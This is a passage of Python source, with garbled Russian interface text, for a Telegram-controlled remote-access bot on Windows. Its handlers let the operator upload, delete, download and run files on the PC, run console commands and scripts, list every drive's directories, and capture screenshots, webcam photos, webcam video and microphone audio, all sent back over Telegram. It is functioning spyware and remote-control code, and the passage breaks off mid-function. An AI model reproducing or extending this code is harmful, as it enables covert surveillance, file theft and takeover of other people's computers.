            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–ø–∞–ø–∫–∞ –Ω–µ –±—ã–ª–∞ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ –∫ –Ω–µ–π –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*', parse_mode='Markdown')
            return delete_menu(message)

        bot.send_message(message.chat.id, f'‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ *{message.text.strip()}* –±—ã–ª–∞ —É–¥–∞–ª–µ–Ω–∞!', parse_mode = "Markdown")
        return delete_menu(message)


    def download_on_pc_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*‚öΩÔ∏è –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é –≤—ã–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤!*', reply_markup=download_on_pc_menu_keyboard, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_download_on_pc)

    def check_download_on_pc(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == download_on_pc_menu_text_upload_photo:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω–æ–µ —Ñ–æ—Ç–æ\n(–ü—Ä–∏–º–µ—Ä: C:\\test.jpg)*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, download_photo)

        elif message.text.strip() == download_on_pc_menu_text_upload_other:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –≤—ã–≥—Ä—É–∂–µ–Ω–Ω—ã–π —Ñ–∞–π–ª\n(–ü—Ä–∏–º–µ—Ä: C:\\test.txt)*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, download_file_on_pc)
            
        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return download_on_pc_menu(message)


    def download_file_on_pc(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –ú–ë)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())

    def download_file_on_pc1(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
            
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        try:
            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
            bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
            return download_on_pc_menu(message)
        except:
            bot.send_message(message.chat.id, '*‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
            return download_on_pc_menu(message)


    def download_photo(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*‚úçÔ∏è –ü—Ä–∏—à–ª–∏—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≥—Ä—É–∑–∏—Ç—å (–¥–æ 20 –ú–ë)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_photo_on_pc, message.text.strip())

    def download_photo_on_pc(message: types.Message, route: str):
        if is_access_denied(message.from_user): return None
        
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file: new_file.write(downloaded_file)
            bot.send_message(message.chat.id, '*‚òëÔ∏è –£—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ!*', parse_mode="Markdown")
            return download_on_pc_menu(message)
        
        except:
            bot.send_message(message.chat.id, '*‚ùå –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω, –∏–ª–∏ —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π, –∏–ª–∏ —É–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!*', parse_mode="Markdown")
            return download_on_pc_menu(message)


    def files_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '*üóÇ –í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é —Ñ–∞–π–ª–æ–≤!*', reply_markup=files_menu_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, files_menu_check)

    def files_menu_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == file_menu_edit_files:  return change_file_menu(message)
        elif message.text.strip() == back_text: return start(message)
        elif message.text.strip() == file_menu_delete_files_and_folders: return delete_menu(message)
        elif message.text.strip() == file_menu_upload_file_to_pc: return download_on_pc_menu(message)
        elif message.text.strip() == file_menu_create_files_and_folders:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í—ã–±–µ—Ä–∏—Ç–µ —Ç–æ, —á—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –∏–ª–∏ –≤–µ—Ä–Ω–∏—Ç–µ—Å—å –Ω–∞–∑–∞–¥!*', reply_markup=files_menu_check_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, check_create)

        elif message.text.strip() == file_menu_start_programm:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ (–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å!*', reply_markup=back_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, open_file)

        elif message.text.strip() == file_menu_download_file_by_pc:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞ (–ü—Ä–∏–º–µ—Ä: test.txt), –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ –∏–∑ —ç—Ç–æ–π –ø–∞–ø–∫–∏, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π –ø—É—Ç—å (–¥–æ 50 –º–±)*', reply_markup=back_keyboard, parse_mode="Markdown")
            return bot.register_next_step_handler(message, download_file)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return files_menu(message)


    def check_create(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return files_menu(message)
        elif message.text.strip() == '/start': return start(message)
        if message.text.strip() == files_menu_check_text_create_folder:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞(–ü—Ä–∏–º–µ—Ä: test.txt)!*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_file)

        elif message.text.strip() == files_menu_check_text_create_folder:
            bot.send_message(message.chat.id, '*‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –Ω–æ–≤–æ–π –ø–∞–ø–∫–µ –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –≤–≤–µ–¥–∏—Ç–µ –µ–µ –Ω–∞–∑–≤–∞–Ω–∏–µ, –µ—Å–ª–∏ —Ö–æ—Ç–∏—Ç–µ –µ–µ —Å–æ–∑–¥–∞—Ç—å –≤ –º–µ—Å—Ç–µ, –≥–¥–µ –∑–∞–ø—É—â–µ–Ω —Å–∫—Ä–∏–ø—Ç\n\n‚ùóÔ∏è –ü—Ä–∏–º–µ—Ä –ø—É—Ç–∏: C:\\–ù–æ–≤–∞—è –ø–∞–ø–∫–∞*', parse_mode="Markdown", reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_folder)

        bot.send_message(message.chat.id, wrong_choice, parse_mode="Markdown")
        return files_menu(message)

    def create_folder(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
        try: os.mkdir(message.text.strip())
        except:
            bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –º–µ—Å—Ç–∞*', parse_mode="Markdown")
            return files_menu(message)
        
        bot.send_message(message.chat.id, f'*‚òëÔ∏è –ü–∞–ø–∫–∞ –ø–æ –ø—É—Ç–∏ "{message.text.strip()}" –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!*', parse_mode="Markdown")
        return files_menu(message)


    def download_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return files_menu(message)

        try: bot.send_document(message.chat.id, open(message.text.strip(), 'rb')) 
        except: bot.send_message(message.chat.id, '‚ùå –û—à–∏–±–∫–∞: *–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∏–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç*', parse_mode='Markdown')
            
        return files_menu(message)


    def open_file(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == "/start": return start(message)
        elif message.text.strip() == back_text: return files_menu(message)
                
        try: os.startfile(message.text.strip())
        except: bot.send_message(message.chat.id, '‚ùå *–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –¥–æ—Å—Ç—É–ø!*', parse_mode="Markdown")
        else: bot.send_message(message.chat.id, f'*‚òëÔ∏è –§–∞–π–ª {message.text.strip()} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*', parse_mode="Markdown")
        
        return files_menu(message)


    def create_msgbox(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–ù–∞–ø–∏—à–∏—Ç–µ —Ç–µ–∫—Å—Ç, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–æ–±—Ä–∞–∑–∏—Ç—Å—è –≤ –¥–∏–∞–ª–æ–≥–æ–º –æ–∫–Ω–µ!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, create_msgbox_check, message.text.strip())

    def create_msgbox_check(message: types.Message, title: str):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == '/start': return start(message)
        elif message.text.strip() == back_text: return console_menu(message)

        bot.send_message(message.chat.id, '‚ùóÔ∏è *–ë—ã–ª–æ –≤—ã–≤–µ–¥–µ–Ω–æ –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ –Ω–∞ —ç–∫—Ä–∞–Ω –ü–ö! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –¥–æ–∂–¥–∏—Ç–µ—Å—å, –∫–æ–≥–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–∫—Ä–æ–µ—Ç –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ*', parse_mode='Markdown')
        console_menu(message)
        result = windll.user32.MessageBoxW(0, message.text.strip(), title, 0x1000)
        
        if result == 1:
            bot.send_message(message.chat.id, f'üîí –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ü–ö —Ä–µ—à–∏–ª –∑–∞–∫—Ä—ã—Ç—å –¥–∏–∞–ª–æ–≥–æ–≤–æ–µ –æ–∫–Ω–æ üîí\n\n‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –¥–∏–∞–ª–æ–≥–æ–≤–æ–º –æ–∫–Ω–µ ‚ÑπÔ∏è\n\nüí¨ –ó–∞–≥–æ–ª–æ–≤–æ–∫ –¥–∏–∞–ª–æ–≥–æ–≤–æ–≥–æ –æ–∫–Ω–∞: *{title}*\nüìã –°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏–∞–ª–æ–≥–æ–≤–æ–≥–æ –æ–∫–Ω–∞: *{message.text.strip()}*', parse_mode='Markdown')
        
        return

    def console_menu(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, 'üíª *–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ –º–µ–Ω—é –∫–æ–Ω—Å–æ–ª–∏!*', reply_markup=console_menu_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, console_menu_check)

    def console_menu_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == console_menu_list_process: return process_list(message)
        elif message.text.strip() == console_menu_enter_commands: 
                markup = types.ReplyKeyboardMarkup(one_time_keyboard = False, resize_keyboard=True).add(*CMDS, back_text, row_width=2)
                bot.send_message(message.chat.id, 'üñ• *–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏!\n\n‚ùóÔ∏è –ü—Ä–∏ –ª—é–±—ã—Ö –Ω–µ–ø–æ–Ω—è—Ç–Ω—ã—Ö —Å–∏—Ç—É–∞—Ü–∏—è—Ö –≤–≤–æ–¥–∏—Ç–µ /start*', reply_markup=markup, parse_mode='Markdown')
                return bot.register_next_step_handler(message, console_commands)

        elif message.text.strip() == console_menu_screenshot: return screenshot(message)

        elif message.text.strip() == console_menu_webcam:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    cv2.imwrite('webcam.png', frame)
                    cap.release()
                    bot.send_photo(message.chat.id, open("webcam.png", "rb"))
                    os.remove("webcam.png")
                    return console_menu(message)
                else:
                    bot.send_message(message.chat.id, "*‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã*", parse_mode='Markdown')
            except Exception as e:
                print(e)
                bot.send_message(message.chat.id, "*‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –≤–µ–±-–∫–∞–º–µ—Ä–æ–π*", parse_mode='Markdown')
                return console_menu(message)

        elif message.text.strip() == console_menu_webvideocam: return webvideocam(message)

        elif message.text.strip() == console_menu_microphone: return process_record_quest(message)

        elif message.text.strip() == console_menu_check_directories: return check_directories(message)
        elif message.text.strip() == console_menu_create_msgbox:
            bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –¥–∏–∞–ª–æ–≥–æ–≤–æ–≥–æ –æ–∫–Ω–∞!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, create_msgbox)

        elif message.text.strip() == console_menu_start_python_script:
            bot.send_message(message.chat.id, '‚ùóÔ∏è *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —Å–∫—Ä–∏–ø—Ç–∞!*', parse_mode='Markdown', reply_markup=back_keyboard)
            return bot.register_next_step_handler(message, python_scripts)

        elif message.text.strip() == console_menu_open_site:
            bot.send_message(message.chat.id, '‚úçÔ∏è *–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å —Å–∞–π—Ç–∞! (–µ—Å–ª–∏ –≤—ã –≤–≤–µ–¥–µ—Ç–µ –∞–¥—Ä–µ—Å –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ https, —Ç–æ —Å–∞–π—Ç—ã –±—É–¥—É—Ç –æ—Ç–∫—Ä—ã–≤–∞—Ç—å—Å—è —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ IE (Internet Explorer), —á—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –≤ –¥—Ä—É–≥–æ–º –±—Ä–∞—É–∑–µ—Ä–µ, –¥–æ–±–∞–≤—å—Ç–µ –∫ —Å—Å—ã–ª–∫–µ –ø—Ä–æ—Ç–æ–∫–æ–ª HTTPS)*\n\n–ü—Ä–∏–º–µ—Ä—ã:\nhttps://resp05.ru - –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Å–∞–π—Ç –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç –≤ –±—Ä–∞—É–∑–µ—Ä–µ Yandex –∏–ª–∏ Google.\nresppl.ru - –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —Å–∞–π—Ç –±—É–¥–µ—Ç –æ—Ç–∫—Ä—ã—Ç —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ Internet Explorer.', reply_markup=back_keyboard, parse_mode='Markdown')
            return bot.register_next_step_handler(message, open_site)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return console_menu(message)

    def screenshot(message: types.Message):
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))
            return console_menu(message)

        except PermissionError:
            bot.send_message(message.chat.id, '‚ùå *–£ –±–æ—Ç–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!*', parse_mode='Markdown')
            return console_menu(message)
        
    def screen(message: types.Message):
        try:
            if os.path.exists('C:\\temp\\') == False: make_temp_folder()
            pyautogui.screenshot('C:\\temp\\screenshot.png')
            bot.send_document(message.chat.id, open('C:\\temp\\screenshot.png', 'rb'))

        except PermissionError:
            bot.send_message(message.chat.id, '‚ùå *–£ –±–æ—Ç–∞ –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤!*', parse_mode='Markdown')

    def webvideocam(message: types.Message):
        if is_access_denied(message.from_user):
            return None

        bot.send_message(message.chat.id, "üïí –£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö –¥–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –µ–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ - 60 —Å–µ–∫—É–Ω–¥", reply_markup=back_keyboard)
        bot.register_next_step_handler(message, webvideocam_process)

    def webvideocam_process(message: types.Message):
        if is_access_denied(message.from_user):
            return None

        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            duration = int(message.text)

            if duration > 60:
                bot.send_message(message.chat.id, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ - 60 —Å–µ–∫—É–Ω–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–æ 60.")
                return webvideocam(message)

            cap = cv2.VideoCapture(0)
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 0)
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 0)
            cap.set(cv2.CAP_PROP_EXPOSURE, -4)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

            out = cv2.VideoWriter('output.avi', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (1280, 720))

            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break

            cap.release()
            out.release()

            with open('output.avi', 'rb') as video_file:
                bot.send_video(message.chat.id, video_file)

            try:
                os.remove("output.avi")
                return console_menu(message)
            except Exception as e:
                bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞: {e}")
                return console_menu(message)

        except Exception as e:
            bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}. –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É")
            return console_menu(message)
        
    def check_directories(message: types.Message):
        if is_access_denied(message.from_user): return None

        bot.send_message(message.chat.id, '*–í—ã –ø–µ—Ä–µ—à–ª–∏ –≤ —Ä–∞–∑–¥–µ–ª –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –∫–æ–º–ø—å—é—Ç–µ—Ä–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ —Ö–æ—Ç–∏—Ç–µ —Å–æ–≤–µ—Ä—à–∏—Ç—å.*', reply_markup=directories_keyboard, parse_mode="Markdown")
        return bot.register_next_step_handler(message, check_directories_status)

    def check_directories_status(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == directories_check_all_directories: return check_all_directories(message)
        elif message.text.strip() == directories_search_directories: return search_directories(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return check_directories(message)

    def check_all_directories(message: types.Message):
        if is_access_denied(message.from_user): return None

        bot.send_message(message.chat.id, '*üïí –ü—Ä–æ—Ü–µ—Å—Å –≤—ã–≥—Ä—É–∑–∫–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π –≤—Å–µ—Ö –¥–∏—Å–∫–æ–≤ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 5-—Ç–∏ –º–∏–Ω—É—Ç. ‚è≥*', reply_markup=back_keyboard, parse_mode="Markdown")
        
        drives = ['C:\\', 'D:\\', 'E:\\']
        file_list = ""

        for path in drives:
            if os.path.exists(path):
                try:
                    file_list += f"üìÅ –î–∏—Å–∫ {path}"
                    file_list += list_files(path)
                except Exception as e:
                    bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞: str(e). –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.")
        
        with open("file_list.txt", "w", encoding='utf-8') as file:
            file.write(file_list)
        
        with open("file_list.txt", "rb") as file:
            bot.send_document(message.chat.id, file)    
        try:
            os.remove("file_list.txt")
        except PermissionError:
            pass
        
        return check_directories(message)

    def search_directories(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, "üìÇ *–í–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏, –≤ –∫–æ—Ç–æ—Ä–æ–π –Ω—É–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø–æ–∏—Å–∫:*", reply_markup=back_keyboard, parse_mode='Markdown')
        bot.register_next_step_handler(message, search_directory)

    def search_directory(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)

        path = message.text.strip()
        
        if os.path.exists(path):
            file_list = list_files(path)
            with open("file_list.txt", "w") as file:
                file.write(file_list)
            with open("file_list.txt", "rb") as file:
                bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, "*–§–∞–π–ª —Å–æ —Å–ø–∏—Å–∫–æ–º —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω. üìÅüì©*", parse_mode='Markdown')
            try:
                os.remove("file_list.txt")
            except PermissionError:
                pass
            return check_directories(message)
        else:
            bot.send_message(message.chat.id, "*–£–∫–∞–∑–∞–Ω–Ω—ã–π –ø—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –ø—É—Ç—å.*", parse_mode='Markdown')
            return check_directories(message)

    def process_record_quest(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, '*üïí –£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö –¥–ª—è –±–æ–ª–µ–µ —Ç–æ—á–Ω–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –µ–µ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏. –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞—É–¥–∏–æ–∑–∞–ø–∏—Å–∏ - 60 —Å–µ–∫—É–Ω–¥.*', reply_markup=back_keyboard, parse_mode='Markdown')
        bot.register_next_step_handler(message, process_record_duration)

    def process_record_duration(message: types.Message):
        if is_access_denied(message.from_user): return None

        if message.text.strip() == back_text: return console_menu(message)
        elif message.text.strip() == '/start': return start(message)

        try:
            record_seconds = int(message.text)
            if record_seconds > 60:
                bot.send_message(message.chat.id, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –ø—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –≤–∏–¥–µ–æ - 60 —Å–µ–∫—É–Ω–¥. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–æ 60.")
                return webvideocam(message)
            audio_file = open(record_audio(record_seconds), 'rb')
            bot.send_audio(message.chat.id, audio_file)
            audio_file.close()
            os.remove(audio_file.name)
        except ValueError:
            bot.send_message(message.chat.id, 'üïí –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –¥–ª—è –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö.', parse_mode='Markdown')
            
        return console_menu(message)

    def process_list(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        processes = '–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n\n'
        for i in psutil.pids():
